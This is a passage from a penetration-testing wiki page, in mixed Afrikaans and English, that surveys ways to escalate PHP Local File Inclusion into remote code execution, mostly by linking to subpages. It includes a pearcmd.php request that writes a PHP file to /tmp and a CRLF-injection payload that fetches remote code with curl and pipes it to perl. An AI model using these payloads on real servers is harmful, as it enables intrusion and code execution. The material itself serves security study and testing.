This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) verduidelik dat jy **php filters kan gebruik om ewekansige inhoud as output te genereer**. Dit beteken basies dat jy **ewekansige php-kode kan genereer** vir die include **sonder om dit in ’n lêer te skryf**.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

**Upload** 'n lêer wat as **tydelike** in `/tmp` gestoor sal word, dan in die **dieselfde request,** veroorsaak 'n **segmentation fault**, en dan sal die **tydelike lêer nie verwyder word nie** en jy kan daarna soek.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

If you found a **Local File Inclusion** and **Nginx** is running in front of PHP you might be able to obtain RCE with the following technique:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

If you found a **Local File Inclusion** even if you **don't have a session** and `session.auto_start` is `Off`. If you provide the **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST** data, PHP will **enable the session for you**. You could abuse this to get RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

If you found a **Local File Inclusion** and and the server is running in **Windows** you might get RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Die volgende misbruik 'n CRLF vuln om RCE te kry (van [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file_uploads = on)

As jy 'n **Local File Inclusion** gevind het en 'n lêer wat **phpinfo()** openbaar het met file_uploads = on, kan jy RCE kry:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

As jy 'n **Local File Inclusion** gevind het en jy **can exfiltrate the path** of the temp file BUT die **server** is **checking** if the **file to be included has PHP marks**, kan jy probeer om daardie kontrole te **bypass** met hierdie **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Via eternal waiting + bruteforce

As jy die LFI kan misbruik om **upload temporary files** en die server se PHP-uitvoering te laat **hang**, kan jy daarna **brute force filenames during hours** om die temporêre lêer te vind:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Na Fatal Error

If you include any of the files `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (You need to include the same one 2 time to throw that error).

**Ek weet nie hoe dit nuttig is nie, maar dit kan wees.**\
_Selfs as jy 'n PHP Fatal Error veroorsaak, word PHP temporêre lêers wat opgelaai is verwyder._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
